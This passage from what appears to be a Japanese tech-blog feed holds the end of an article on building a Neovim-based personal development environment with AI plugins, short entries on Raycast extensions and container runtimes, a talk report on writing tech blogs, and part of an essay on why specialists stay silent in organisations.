Codeに渡せる。Neovim内のAIツールNeovim内ではCopilotとAvanteを併用している。github.comCopilotはインライン補完用。コードを書いている最中に候補が表示され、Tabで確定する。考えながら書くときに便利。copilot-cmpと組み合わせて、補完メニューの最上位にCopilotの提案が表示されるようにしている。github.comCopilotChatはAIチャット用。コードの説明、修正、テスト生成、ドキュメント生成などをチャット形式で行える。モデルはclaude-sonnet-4を使用。{  \\"CopilotC-Nvim/CopilotChat.nvim\\",  opts = { model = \\"claude-sonnet-4\\" },  keys = {    { \\"<leader>ao\\", \\"<cmd>CopilotChatOpen<cr>\\", desc = \\"Open Chat\\" },    { \\"<leader>ae\\", \\"<cmd>CopilotChatExplain<cr>\\", desc = \\"Explain Code\\", mode = { \\"n\\", \\"v\\" } },    { \\"<leader>af\\", \\"<cmd>CopilotChatFix<cr>\\", desc = \\"Fix Code\\", mode = { \\"n\\", \\"v\\" } },    { \\"<leader>at\\", \\"<cmd>CopilotChatTests<cr>\\", desc = \\"Generate Tests\\", mode = { \\"n\\", \\"v\\" } },    { \\"<leader>ad\\", \\"<cmd>CopilotChatDocs<cr>\\", desc = \\"Generate Docs\\", mode = { \\"n\\", \\"v\\" } },    { \\"<leader>aR\\", \\"<cmd>CopilotChatReview<cr>\\", desc = \\"Review Code\\", mode = { \\"n\\", \\"v\\" } },  },}github.comAvanteはCursorエディタのAI機能をNeovim上に再現するプラグイン。ファイル横断の変更や設計相談に使う。<leader>aaで質問すると、サイドパネルが開いてAIとの対話が始まる。{  \\"yetone/avante.nvim\\",  opts = {    provider = \\"copilot\\",    mode = \\"agentic\\",    providers = {      copilot = { model = \\"claude-sonnet-4\\" },    },    mappings = {      ask = \\"<leader>aa\\",      edit = \\"<leader>ax\\",    },  },}AI統合のキーマップまとめ キー  プラグイン  説明  <leader>aa  Avante  AI質問  <leader>ao  CopilotChat  チャットを開く  <leader>ae  CopilotChat  コードを説明  <leader>af  CopilotChat  コードを修正  <leader>at  CopilotChat  テスト生成  <leader>ad  CopilotChat  ドキュメント生成  <leader>aR  CopilotChat  コードレビュー  <leader>cc  Claude Code  Claude Code起動  <leader>cr  Claude Code  会話を再開 6. 言語別の設定Rustは私のメイン言語なので、専用プラグインを導入している。rustaceanvimでrust-analyzerを強化し、crates.nvimでCargo.tomlのバージョンを管理する。Cargo.tomlを開くと、各クレートの最新バージョンがインラインで表示される。github.comgithub.comGo、TypeScript、Pythonは特別な設定をしていない。LSP設定セクションで示したensure_installedにより、各言語サーバーが自動でセットアップされる。保存時の自動フォーマットはconform.nvimに任せている。詳細な設定はdotfilesリポジトリを参照してほしい。7. フォーマッター統合conform.nvimで保存時に自動フォーマット。言語ごとに適切なフォーマッターを設定。{  \\"stevearc/conform.nvim\\",  opts = {    formatters_by_ft = {      lua = { \\"stylua\\" },      rust = { \\"rustfmt\\" },      go = { \\"gofmt\\", \\"goimports\\", \\"gofumpt\\" },      python = { \\"black\\", \\"isort\\" },      typescript = { \\"prettier\\" },      javascript = { \\"prettier\\" },      yaml = { \\"prettier\\" },      json = { \\"prettier\\" },      markdown = { \\"prettier\\" },    },    format_on_save = { timeout_ms = 500, lsp_fallback = true },  },}github.comPDEを育てるということPDEは完成することがない。日々の開発の中で、少しずつ手を入れ続ける。刀から庭へこの記事のタイトルには「刀を打つ」と書いた。実際、PDEには刀を打つ行為がある。ターミナルを選び、シェルを設定し、エディタを組み上げる。ゼロから自分の道具を作り上げていく。ただ、刀には完成がある。名刀は打ち上がれば、あとは研ぎ澄ますだけ。床の間に飾られ、鑑賞される。しかしPDEには完成がない。プラグインは更新され、新しいツールが登場し、自分の作業スタイルも変わる。「完成した」と思った翌週には、また何かをいじっている。最初は名刀を打つつもりだった。「理想の開発環境を作り上げる」という完成形を目指していた。だが10年経って気づいた。私が欲しかったのは名刀ではなく、戦場で使える道具だった。戦場で使える道具とは何か。それは、完成を待たずに使い始められるものだ。使いながら調整し、壊れたら直し、足りなければ足す。常に未完成で、常に変化している。ここで気づいた。私がやっていることは、刀を打つだけではない。打った刀を、日々手入れし続けている。使いながら研ぎ、傷がつけば直し、必要に応じて改良する。この「手入れし続ける」という感覚——何かに似ている。そうだ、庭だ。庭も完成しない。季節ごとに姿を変え、草木は勝手に育ち、手入れを怠れば荒れる。人間が設計するが、人間の思い通りにはならない。それでも手を入れ続けることで、少しずつ自分の形になっていく。宇野常寛さんの『庭の話』という本が、この感覚を言語化してくれた。www.kodansha.co.jp宇野さんは、現代のプラットフォーム（SNS）を「相互評価のゲームに特化した空間」として批判し、対抗概念として「庭」を提示する。プラットフォームが画一化された承認欲求の交換の場であるのに対し、庭は「完全にはコントロールできないもの」との共存の場だ。草木が勝手に育ち、虫が飛び交い、季節によって姿を変える。人間が設計するが、人間の思い通りにはならない。この説明を読んだとき、私は自分のPDEのことを思い浮かべた。プラグインが勝手にアップデートされ、設定が壊れ、新しいツールが登場する。思い通りにならない。でも、手を入れ続けることで、少しずつ自分の形になっていく。宇野さんの言う「プラットフォーム」と「庭」の対比は、そのまま開発環境にも当てはまる。IDEはプラットフォームだ。ベンダーが設計し、万人に最適化されたサービスを提供する。ユーザーはそれを消費する。便利で、効率的で、すぐに使える。しかし、自分でコントロールできる範囲は限られている。一方、PDEは刀を打ち、庭として育てるものだ。自分で道具を作り、その道具を手入れし続ける。プラグインが競合し、設定が壊れ、アップデートで挙動が変わる。それでも、手を入れ続けることで、少しずつ自分の形になっていく。消費ではなく、制作。受け取るのではなく、育てる。宇野さんは「消費から制作へ」という転換を説く。プラットフォームで承認を求めるのではなく、制作に没頭すること。エンジニアとして、私たちは「正解」を求めがちだ。最適解を見つけ、効率を最大化し、その成果で報われたいと思う。だが、PDEにはそういう正解がない。「正しい設定」も「最適なプラグイン構成」も存在しない。ネットで見つけた「おすすめ設定」をコピペしても、それは自分の刀にはならない。正解を求めて報われようとするのをやめる。他者から評価される「模範解答」を探すのではなく、自分の手に馴染む道具を、自分のために作る。PDEを構築する行為は、まさにこの「制作」だ。誰かに見せるためではなく、自分のために作る。その過程で、ツールとの対話が生まれる。「家庭」という言葉は「家」と「庭」でできている。宇野さんは「家」の内部で承認を交換するだけでは見えないものが「庭」にはあると言う。開発環境も同じだ。IDEという「家」の中で完結するのではなく、PDEという「庭」に出ることで、ツールとの新しい関係が見えてくる。ツールと思考の相互作用ツールとの新しい関係とは何か。PDEを10年実践する中で、1つ気づいたことがある。ツールは思考に影響し、思考はツールに影響される。これは単なる比喩ではない。以前、AIエージェントとの協働について書いた記事で、私は「集中とは自分の能力ではなく環境との関係である」と述べた。syu-m-5151.hatenablog.com環境との関係——これはPDEにも当てはまる。具体的な例を挙げよう。Vimのモーダル編集を使い始めると、テキスト操作を「動詞＋名詞」で考えるようになる。d（削除）+ w（単語）で「単語を削除」。この思考パターンは、コードを書くときの発想にも影響する。操作を小さな単位に分解し、組み合わせて目的を達成する。逆に、自分の思考スタイルに合わないツールは、どれだけ高機能でも使いこなせない。合わないものは合わない。それだけのことだ。重要なのは、この相互作用を意識的に活用することだ。新しいツールを導入するとき、私は「このツールは自分の思考をどう変えるか」を考える。AIエージェントを使い始めたとき、深く没入する集中から、複数タスクを並行監視する集中へと、思考のモードを切り替える必要があった。環境が変われば、思考も変わるべきなのだ。PDEとは、単にツールをカスタマイズすることではない。自分の思考とツールの関係を最適化し続けることだ。AIは庭の一部か、庭師か2025年のPDEを語る上で、AIツールの位置づけは避けて通れない。私はClaude Codeを「主軸」と書いた。しかし、これは従来のツールとは異なる存在だ。Neovimは私が設定し、私が操作する。一方Claude Codeは、私と対話し、私の意図を解釈し、時に私が思いつかなかったアプローチを提案する。これは庭の一部なのか、それとも共に庭を育てる存在なのか。正直に言えば、まだ答えは出ていない。ただ、1つ確かなことがある。CLAUDE.mdを更新し、カスタムコマンドを調整し、エージェントを育てる——この作業は、Neovimのプラグイン設定と同じ感覚だ。AIツールもまた、PDEの一部として「育てる」対象になっている。同時に、Claude Codeは私のPDEを育てる側でもある。「この設定、冗長では」「こういうプラグインがある」と提案してくる。人間が庭を育て、庭が人間を育てる。その関係がAIツールとの間にも成り立っている。私のPDE改善サイクルでは、具体的にどうやってPDEを育てているのか。私の場合、こんなサイクルを回している。気づく: 「この操作、毎日10回はやってるな」調べる: 既存のプラグインや設定で解決できないか試す: 設定を追加して数日使ってみる磨く: 使いにくければ調整、良ければ定着このサイクルを回し続けていると、つい完璧を目指したくなる。だが、ここで立ち止まる必要がある。すべてを自作する必要はない。すべてをOSSで揃える必要もない。それをやると疲れる。Fish、Warp、Starshipを選んだのも「設定なしで賢い」からだ。力を入れるところと抜くところを分ける。適度にやっていくことが、PDEを長く続けるコツだと思う。これもまた、刀を打ち、庭として育てることの本質だ。名刀を打つなら妥協は許されない。だが戦場で使う刀は違う。多少キズがあっても戦えればいい。庭も同じだ。すべてを自分で育てる必要はなく、買ってきた苗を植えてもいい。大事なのは、戦場で戦えること。実際の開発で使えること。完璧な道具を作ることではない。設定ファイルの管理dotfilesはGitで管理。どのマシンでも同じ環境を再現できる。dotfiles/├── fish/           # Fish shell├── nvim/           # Neovim├── warp/           # Warp terminal├── starship/       # Starship prompt└── git/            # Git config5年後、PDEは存在するかAIの進化を見ていると、ふと考えることがある。5年後、開発環境を「自分で構築する」という行為に意味はあるのか。AIがコードを書き、テストを実行し、デプロイまで行う時代が来るかもしれない。そのとき、エディタの設定にこだわる意味があるのか。Neovimのキーバインドを覚える価値があるのか。正直に言えば、分からない。5年後の開発がどうなっているか、誰にも予測できない。ただ、こうも思う。むしろ逆かもしれない、と。従来、PDEの構築には学習コストとメンテナンスコストがかかり、それに見合う生産性向上が得られるかは不透明だった。しかしAIは、このトレードオフを限りなく等価に近づけてくれる。環境を改善すれば、その改善がAIを介して直接生産性に反映される。CLAUDE.mdを1行書き足せば、その分だけAIの出力が良くなる。PDEが「趣味」から「現実的に有効な投資」になる時代が来ているのかもしれない。ただ、1つだけ確信していることがある。「自分で作りたい」という欲求は消えない。ツールが変わっても、プラットフォームが変わっても、「与えられたものをそのまま使うのではなく、自分の手を入れたい」という欲求は残る。少なくとも、私はそういう人間だ。AIがすべてを生成する時代が来ても、そのAIをどう使うか、どうカスタマイズするか、どう自分のワークフローに組み込むか——そこにPDEの精神は生き続けると思う。道具は変わっても、道具との関係を自分で設計したいという欲求は変わらない。まとめここまで私のPDE構成を紹介してきた。Warp上でFishを動かし、NeovimとClaude Codeを併用する——これらを組み合わせて、自分だけの「刀」を作り上げて「庭」を育てている。PDEを選ぶ理由は効率では説明できない。最初の2週間は生産性が落ちるし、1ヶ月かけて元に戻る。それでも、自分で組み上げ、日々改善していく過程そのものに価値がある。消費ではなく制作、受け取るのではなく育てる。だからといって、完璧を目指す必要はない。名刀を打つ必要はない。すべてを自作する必要もない。大事なのは、明日の開発で戦えること。そのために、今日少しだけ環境を良くする。その繰り返しがPDEだ。もし「自分で作ってみたい」という気持ちがあるなら、試してみてほしい。合わなかったら戻ればいい。IDEという最強の武器は、いつでもそこにある。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。この記事で紹介した設定ファイルは以下のリポジトリで公開している。github.com","isoDate":"2025-12-14T04:25:52.000Z","dateMiliSeconds":1765686352000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Raycast Extension 開発のすすめ","link":"https://zenn.dev/iorandd/articles/20251215_start-raycast-extension-dev","contentSnippet":"本記事は 3-shake Advent Calendar 2025 14日目の記事です。Raycast Advent Calendar 2025 でも2025年10月下旬に行われたRaycast Community Japan 主催イベントに3連続で参加した話を書きます。Raycast Extension開発やコミュニティに興味を持ったきっかけとなったイベントなので、よければ読んでください。この記事ではRaycast Extension をローカルで作ってStoreに出すまでの手順を解説します。 1. Extensionを作るべき理由 RaycastとはRaycast は...","isoDate":"2025-12-13T15:00:00.000Z","dateMiliSeconds":1765638000000,"authorName":"Itaru Ota","authorId":"iota"},{"title":"デタッチドマウントとコンテナランタイム","link":"https://qiita.com/ys1/items/eac9727ec1d4e71a3cd7","contentSnippet":"はじめにこの記事はQiita 3-shake Advent Calendar 2025 シリーズ13日目の記事です。最近、低レベルコンテナランタイムである youki にコントリビュートしており、特にデタッチドマウントについて調べる機会があったので、その内容を共有しま...","isoDate":"2025-12-13T11:58:19.000Z","dateMiliSeconds":1765627099000,"authorName":"Yusuke Sakurai","authorId":"ysakurai"},{"title":"『おい、テックブログを書け』というタイトルで登壇しました","link":"https://syu-m-5151.hatenablog.com/entry/2025/12/13/145159","contentSnippet":"はじめに正直に言うと、私はキャリアの序盤、破滅的な文章を書く人間だった。誰が読むのか考えていない文章を書きまくっていた。学生時代に読書感想文のコンクールで優勝したこともなければ、文章を褒められた経験もほとんどない。それでも書き続けて、今はこうして登壇の機会をいただけるようになった。2025年12月5日、Forkwell Communityのイベント「おい、テックブログを書け」で登壇しました。forkwell.connpass.com発表資料はこちらです。 speakerdeck.com「おい、」シリーズがイベントになった私は「おい、」シリーズというブログを書いている。元々は書籍用に書き溜めていた文章を公開する場所として始めたものだが、ありがたいことに多くの反響をいただいている。syu-m-5151.hatenablog.com今回のイベントは、Forkwellのかわまたさんにお誘いいただいて実現した。かわまたさんには以前も「転職したらMCPサーバーだった件」というイベントでお声がけいただいた。 speakerdeck.com貴重な登壇の機会をいただいているのにこんなことを言うのはあれだが、結構変なことをさせてくれる。変な人だ（褒めている）。自分もこれぐらいふざけた企画をできるくらい組織で信用されたい。とめちゃくちゃに思う。こうした機会をもらえるのは、発信を続けてきたからだ。私よりエンジニアとしても語り手や書き手としても才能のある人はたくさんいる。でも、その才能を発揮せずに誰からも見つからないままでいる人も多い。なぜ発信しないのか。まず、炎上が怖い。間違ったことを書いたら叩かれるんじゃないか。知識不足を晒して恥をかくんじゃないか。そう思うと、公開ボタンを押す手が止まる。次に、時間がない。業務が終わってから記事を書くのは大変だ。言いたいことを整理して、文章にまとめて、推敲して。そこまでの気力が残っていない日も多い。組織の問題もある。評価制度が発信を評価しない会社では、ブログを書いても給料は上がらない。それどころか「そんな暇があったらコードを書け」と言われることもある。発信は「業務外の趣味」として扱われる。こうした障壁は確かに存在する。でも、それらすべてを解決してから書き始める必要はない。まず書いてみることなら、今日からでもできる。炎上が怖いなら、小さな技術メモから始めればいい。時間がないなら、完璧を目指さず短い記事でいい。組織が変わらなくても、自分のブログは自分で始められる。書き始めるとき、人は出発点ばかり気にしがちだ。「自分には文章の才能がない」「最初からうまく書ける人には敵わない」──そう思って発信をためらう人がいる。でも、書く力は後天的になんとかなる。出発点が低くても、続けていれば追いつける。追い越せることだってある。見てくれた皆さんには、発信やアウトプットを通じて才能を発揮し、それに見合った評価や機会を得てほしい。そう思って今回の登壇資料を作った。書くときに大切にしていること資料では「どう書くか」の型を紹介したが、その前提にある考え方も書いておきたい。私が意識しているのは3つある。「なぜ」を問うこと、「変化」を描くこと、「ゆらぎ」を残すこと。この3つは独立しているようで、実は重なり合っているので紹介していきたい。「なぜ」を問い続ける単なる事実や記録ではなく、理由や背景を深掘りする姿勢が大切だ。たとえば「Aを使った」だけでなく「なぜAを選んだのか」「なぜBではダメだったのか」を書く。読者が最も知りたいのは「なぜ」の部分だ。選択の理由を言語化することで、自分の理解も深まる。ところが、技術ブログでありがちなのは、手順だけを淡々と書いてしまうこと。「この設定を入れます」「このコマンドを実行します」──それだけでは公式ドキュメントの劣化コピーになる。「なぜこの設定なのか」「なぜこの順番なのか」「なぜ他の方法ではダメだったのか」を書くことで、初めて読む価値が生まれる。「なぜ？」の部分が業務事情に抵触する場合もある。具体的な数値や社内の意思決定プロセスは書けない。そういうときは、一般的な観点に置き換える工夫をすればいい。「弊社の事情で」ではなく「〇〇のようなケースでは」と書く。具体的な比較ができないなら「一般的にAとBにはこういう違いがある」と整理する。工夫次第で、機密を守りながら「なぜ」を伝える方法はいくらでもある。「なぜ？」を問い続けると、自分の理解の浅さに気づくこともある。それでいい。書くことは、自分の理解を試す行為でもある。書けないということは、わかっていないということだ。その気づきこそが成長の起点になる。「行動」と「変化」のあるストーリーにする「なぜ」を問い続けていると、自然と「変化」が見えてくる。最初はこう思っていた、でも調べていくうちにこう変わった。その変化こそが、記事の核になる。人は変化の物語に心を動かされる。問題に出会い、試行錯誤し、解決に至る。その過程で自分の理解がどう変わったか。「わからない」から「わかった」への変化こそが、読者にとって価値のある情報だ。だから、静的な情報の羅列は退屈だ。「Kubernetesのリソース制限には以下の種類があります」と書くより、「OOMKilledで3時間溶かした。原因を調べていくうちに、リソース制限の仕組みが腹落ちした」と書く方が読まれる。同じ情報でも、変化の物語として語ることで、読者は追体験できる。行動と変化を意識すると、自然と時系列が生まれる。最初に何を思っていたか、何をしたか、何が起きたか、どう理解が変わったか。この流れがあるだけで、記事は格段に読みやすくなる。そして、変化には「失敗」も含まれる。むしろ失敗からの学びの方が読者には刺さる。「最初からうまくいきました」という記事より、「こう考えて失敗し、別のアプローチで解決した」という記事の方が、読者の記憶に残る。失敗を隠さず、そこから何を学んだかを書くことで、記事に深みが出る。「気持ちのゆらぎ」を素直に残す失敗を書くとき、その時の迷いや不安も一緒に残しておくといい。整いすぎた文章は、かえって心に響かない。なぜか。人間味が消えてしまうからだ。「最初は〇〇だと思っていたけど、実際は違った」「正直、これでいいのか迷った」「ここは今でも自信がない」──そうした揺れを正直に書くことで、読者との距離が縮まる。完璧を装う必要はない。技術ブログを書くとき、つい「わかっている人」として振る舞いたくなる。でも、読者が共感するのは「わかっていなかった人がわかるようになる過程」だ。迷い、間違え、遠回りした経験こそが、読者にとって価値がある。気持ちのゆらぎを残すことには、もう1つ意味がある。後から読み返したとき、その時の自分に出会える。「あの頃はこんなことで悩んでいたのか」と思えるのは、整いすぎていない文章だからこそだ。ゆらぎを残すことに抵抗がある人もいるだろう。弱く見えるのではないか、と。でも私の考えは違う。ゆらぎを残すことは、弱さを見せることではない。誠実さを見せることだ。「これが正解です」と断言する記事より、「私はこう考えてこうした、でも別の方法もあるかもしれない」と書く記事の方が、読者は信頼する。技術の世界に絶対の正解は少ない。その不確かさに正直であることが、かえって記事の信頼性を高める。おわりに技術ブログを書くことは、自分の成長のためだ。「なぜ？」を問い続け、変化の物語として語り、気持ちのゆらぎを素直に残す。結果として、それが誰かを救うこともあるかもしれない。私自身がそうだった。冒頭で書いたように、私は「破滅的な文章を書く人間」だった。それでも書き続けて、今がある。苦手から逃げても、その先にあるのはまた別の苦手だ「文章が苦手だから書かない」「人前で話すのが苦手だから発信しない」──そう言って避け続ける人は多い。気持ちはわかる。苦手なことに向き合うのは辛い。できない自分を直視するのは苦しい。でも、逃げた先に何があるだろうか。苦手なことを避け続けても、人生から苦手がなくなるわけではない。文章から逃げれば、別の場面でまた「苦手」にぶつかる。逃げ続けた結果、選択肢がどんどん狭まっていく。気づいたときには、逃げ場すらなくなっている。いま苦手であることと、将来成果を出せるかどうかには、おそらく何の因果関係もない。初期能力が高い人が最終的に優れた成果を出すとは限らない。むしろ、最初から得意な人は壁にぶつかったとき折れやすい。苦手だった人の方が、泥臭く続ける力を持っていたりする。私は明らかに後者だった。最初からうまく書けたわけではない。読み返すと恥ずかしい文章をたくさん書いた。それでも書き続けた結果、今がある。出発点の低さは、到達点を決めない。「自分探し」という名の逃避「自分に向いていることを見つければ、苦労せずに成果が出る」──そんな幻想がある。「自分探し」という言葉は、その幻想を正当化する。本当の自分を見つければ、努力なしに輝ける場所がある。そう信じたい気持ちはわかる。でも、多くの場合それは苦手や欠損から逃れるための言い訳でしかない。向いていないから別のことを探す。それも向いていないから、また別のことを探す。その繰り返しで時間だけが過ぎていく。本当の自分は、探すものではない。目の前のことに向き合い、苦手なことに取り組み続ける中で、少しずつ形作られていくものだ。「これが自分だ」と思えるようになるのは、何かをやり抜いた後だ。やる前からわかるものではない。向いていることを探すより、目の前のことに向き合う方が、よほど確実に成長できる。向いているかどうかは、やってみなければわからない。やり続けてみなければわからない。最初の苦手意識だけで判断するのは、あまりに早すぎる。正しい方向に努力すれば、必ず上達するとはいえ、漫然と続けるだけでは上達しない。書くことと、うまくなることは、自動的にはつながらない。読者の反応を見る。うまい人の文章を読んで、何が違うのか考える。自分の過去記事を読み返して、恥ずかしくなる。そうやってフィードバックを受け取り、意識的に改善しようとすることで、少しずつ書けるようになる。大事なのは、フィードバックループを回すことだ。書く→反応を見る→改善点を見つける→また書く。このサイクルを回し続ければ、必ず上達する。才能の有無ではなく、このループを回し続けられるかどうかが、成長を決める。こう書くと「それは書けた側の言い分だ」と思う人もいるかもしれない。生存者バイアスじゃないか、と。確かにそうだ。書けなかった人の声は届かない。でも、だからこそ書けた側が伝えるしかない。書けないと思っている人、文章に自信がない人に、「それでも書ける」と伝えられるのは、同じ場所から歩いてきた人間だけだ。だから、今日からでも始めてほしい。まずは今日学んだこと、ハマったこと、気づいたことを3行だけ書いてみる。下書きのまま放置している記事があるなら、不完全でもいいから公開してみる。完璧を待っていたら、いつまでも始まらない。苦手だと思っていることほど、始めてしまえば案外なんとかなる。登壇・技術顧問のご依頼について登壇依頼はいつでも募集しています。今回のようなちょっと変わった企画でも大歓迎です。気軽にDMしてください。また、技術顧問業もやっています。SRE、プラットフォームエンジニアリング、組織づくりなど、雑多な質問でもお待ちしております。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。","isoDate":"2025-12-13T05:51:59.000Z","dateMiliSeconds":1765605119000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"NVIDIA 認定資格奮闘記 ~Professional Agentic AI編~","link":"https://zenn.dev/akasan/articles/nvidia_pro_agentic_ai","contentSnippet":"今回はNVIDIAの認定資格であるProfessional Agentic AIを取得したので、その内容を共有しようと思います。 Professional Agentic AIとは？Professional Agentic AI（以下、NCP-AAI）は、マルチエージェントインタラクションや分散推論、スケーラビリティ、倫理的セーフガードに重点を置き、高度なエージェントAIソリューションを設計、開発、展開、管理する能力を試される試験です。エージェント開発だけなくそのサービングやモニタリングなど、DevOpsやMLOpsに関わるような内容が網羅的に出されるのが特徴です。https:/...","isoDate":"2025-12-13T05:21:28.000Z","dateMiliSeconds":1765603288000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"短編：ブログネタってどうやって探してる？お答えします","link":"https://zenn.dev/akasan/articles/blog_neta_howto","contentSnippet":"今回は短編です。のべ240日程度連日テックブログを書いている私ですが、どのようにネタを探しているのかを共有しようと思います。 そもそも何で毎日ブログ書いてるの？詳細は以下の記事にて共有していますが、今改めて毎日書いているモチベをまとめると以下になります。自分の技術に対する興味をせっかくなら発信したいそもそも三日坊主だったので、ちゃんと習慣化できるようになりたかった今更引けないw単純に楽しいhttps://zenn.dev/akasan/articles/4aba4d3a0616ce ネタの探し方私のブログではいくつかの要因によってネタが決まっています。選び方の順...","isoDate":"2025-12-12T14:01:24.000Z","dateMiliSeconds":1765548084000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"専門家は話さないですよ(『専門家が「力」をセーブせずに全力で専門性を振り回してもリスペクトされる組織をつくりたい』を読んで)","link":"https://syu-m-5151.hatenablog.com/entry/2025/12/12/163220","contentSnippet":"はじめに正直に言う。この文章を書くかどうか、ずいぶん迷った。「専門家はもっと声を上げるべきだ」という意見に対して、「いや、話さないんですよ」と返すのは、なんだか後ろ向きに見えるかもしれない。諦めているように聞こえるかもしれない。そういう風に受け取られるのは、ちょっと嫌だな、と思った。でも、書くことにした。なぜなら、「話せばいいじゃん」「振りかざせばいいじゃん」という言葉に、ずっと違和感を抱えてきたからだ。その違和感の正体を、自分なりに言葉にしてみたかった。これは、専門家として組織の中で働いてきた、私個人の経験と考えだ。すべての人に当てはまるとは思わない。でも、同じような経験をしている人が、もしかしたらいるかもしれない。そういう人に届いたらいいな、と思いながら書いている。「専門性の刃で殴りかかってこい」への違和感「専門家が『力』をセーブせずに全力で専門性を振り回してもリスペクトされる組織をつくりたい」という記事を読んだ。専門家はプロらしく専門知識を振りかざしてほしい。そこに忖度はいらない。殺す気でかかってきていい。言っていることが難しくて良い。専門家ってのは、そういうもんだろ、と。痛快だし、気持ちはわかる。専門家がセーブせずに力を振るえる組織という理想像は、多くのエンジニアやデザイナーが心の底で望んでいることだろう。その理想を堂々と語る姿勢には敬意を覚える。フジイさんの記事は、専門家の側に立って「もっと力を発揮していいんだ」と背中を押してくれる。それ自体は素晴らしいことだ。でも、私はこの説明に違和感がある。そして、専門家としては、そういう組織を期待して待っていても仕方ないと思っている。専門家は話さない。振りかざす以前の問題として、そもそも話さない。fujii-yuji.net話すことの面倒くささ専門家が話さない理由は、実はとても単純だ。面倒くさいのだ。自分の中にある専門的な知見を言葉にして口から出した瞬間、それは相手の解釈に委ねられる。どれだけ正確に伝えようとしても、相手の受け取り方は相手次第だ。ずれが生じる。これはいかなるコミュニケーションにおいても不可避だ。そして、ずれた理解に基づいて余計なことを言われる。「それってつまりこういうことですよね」と、全然違う解釈を返される。「でもそれって現実的じゃないですよね」と、文脈を無視した反論が来る。そのたびに「いや、そういうことではなくて」と釈明しなければならない。これが、本当に面倒くさい。だから専門家は話さない。話しても伝わらないし、伝わらなかったときの釈明が面倒くさいから。専門家の言葉が届かなくなるとき他にも組織の中で、専門家の言葉が届かなくなる瞬間がある。エンジニアが「この設計だと将来困ります」と言っても、「今はそれどころではない」と退けられる。デザイナーが「このUIは使いにくい」と指摘しても、「ユーザーは慣れる」と押し切られる。セキュリティの専門家が「この実装は危険です」と警告しても、「リリースを優先して」と言われる。なぜこうなるのか。専門家の意見と非専門家の意見が、同じ重みで扱われるからだ。あるいは、声の大きさや立場の強さで、専門家の意見が上書きされるからだ。「それはあなたの感想ですよね」と言われる。「他の見方もある」と言われる。正しいことを言っているのに、「意見の違い」として処理される。これは単なる無関心ではない。専門知への拒絶だ。専門家が何か言うと、面倒くさがられる。「また難しいことを言っている」「理想論だ」「現場を知らない」と思われる。そのうち、専門家の発言自体が疎まれるようになる。私はこれを「専門家の言葉が死ぬ瞬間」だと思っている。言葉が発せられても、届かない。届いても、受け止められない。受け止められても、行動に変わらない。そういう組織では、専門家は黙るようになる。分業が生む視野の狭さなぜこうなるのか。私なりに考えてみた。こんな経験がある。セキュリティの観点から「この実装は危険だ」と2回警告した。2回とも「リリースを優先して」と言われた。3回目は言わなかった。そして半年後、その実装が遠因でインシデントが起きた。「なぜ発生した」と言われた。言ったんだけどな、と思った。組織が大きくなると、分業が進む。営業、開発、デザイン、マーケティング。それぞれが専門性を高め、効率よく仕事を回せるようになる。これ自体は正しい。でも、分業には副作用がある。自分の担当範囲だけを見るようになる。隣のチームが何をしているか、知らなくても仕事は回る。全体像が見えなくなる。自分の視野がどんどん狭くなっていることに、気づかない。視野が狭くなると、判断がずれる。自分の担当範囲では正しいことが、全体で見ると間違っていることがある。でも、全体が見えないから、そのずれに気づけない。そして、何かを変えようとしても、壁にぶつかる。「それは私の管轄じゃない」「そっちのチームに言ってくれ」「今はそれどころじゃない」。組織の境界線が、行動を阻む。やがて、組織全体が「どうもうまくいっていない」と感じるようになる。でも、何が問題なのかがわからない。みんなが自分の持ち場で懸命に働いているのに、全体としては空回りしている。これが、ある程度成熟した組織が陥る罠だ。誰かが悪いわけではない。構造がそうさせている。話しても届かない構造この構造の中で、専門家はどうなるか。まず、自分の視野が狭くなっていることに気づかなくなる。自分の担当領域のことしか見えない。全体像が見えないから、自分の懸念が組織全体にとってどれだけ重要か、判断できない。「言っても仕方ない」と思ってしまう。次に、何か言っても壁にぶつかる経験を重ねる。「それは私の管轄ではない」「今はそれどころではない」と言われる。何度かそういう経験をすると、言うこと自体をやめる。学習性無力感だ。そして、本質的な問題を指摘しても、表面的な対応で済まされる。「技術的負債を返済しないと」と言っても、「今月のリリースが優先だ」と返される。根本的な問題が見えない組織では、根本的な指摘は届かない。専門家が話さないのは、怠けているからではない。プロ意識が低いからでもない。話しても届かない構造の中に置かれているからだ。何度も壁にぶつかって、学習した結果だ。専門家と非専門家の間にある溝専門家の言葉が届かないのは、誰かが悪いからではない。専門家は自分の領域を深く知っている。だからこそ、何が重要で何が危険かがわかる。でも、その「わかる」が、相手に伝わるとは限らない。非専門家には、非専門家の世界がある。締め切りがあり、予算があり、上からのプレッシャーがある。彼らは彼らなりに合理的に判断している。専門家の言うことが理解できないとき、「今は優先度が低い」と判断するのは、彼らにとっては当然のことだ。つまり、どちらも自分の世界では正しいことを言っている。問題は、それぞれの世界が交差しないことだ。専門家の「危険です」と、非専門家の「今はそれどころじゃない」が、同じ言語で話されているようで、まったく違う文脈に立っている。この溝を埋めるには、お互いの世界を理解しようとする努力がいる。でも、その努力には時間がかかる。そして、時間をかける余裕がない組織では、溝は埋まらないまま放置される。専門知識を振りかざしても、この溝は埋まらない。むしろ、溝を広げてしまうことさえある。「振りかざす」だけでは何も変わらないフジイさんは「専門知識を振りかざせ」と言う。力をセーブするな、忖度するな、と。気持ちはわかる。でも、私の経験では、振りかざしてもうまくいかなかった。専門家が強く主張すればするほど、相手は身構える。「また難しいことを言い始めた」「仕事を遅らせるつもりか」と思われる。こちらは正しいことを言っているつもりなのに、「面倒くさい人」として扱われる。そして、一度そういう印象を持たれると、次から話を聞いてもらえなくなる。「あの人はいつも理想論ばかり言う」というレッテルが貼られる。正しいことを言っているのに、聞いてもらえない。悪循環だ。振りかざすという態度は、相手に「自分の世界を押し付けられている」と感じさせる。人は押し付けられると、反発する。これは自然な反応だ。だから、振りかざしても状況は良くならない。むしろ、悪くなることのほうが多い。対話とは何かじゃあ、どうすればいいのか。私は「対話」だと思っている。ただし、ここで言う対話は「話し合う」という単純なものではない。対話とは、相手の世界に入っていくことだ。相手が何を見ているのか。何を気にしているのか。何を恐れているのか。どういうプレッシャーの中にいるのか。それを理解しようとすること。そして、理解した上で、相手の言葉で、相手の文脈で、自分の知っていることを伝えること。これは「振りかざす」とは正反対の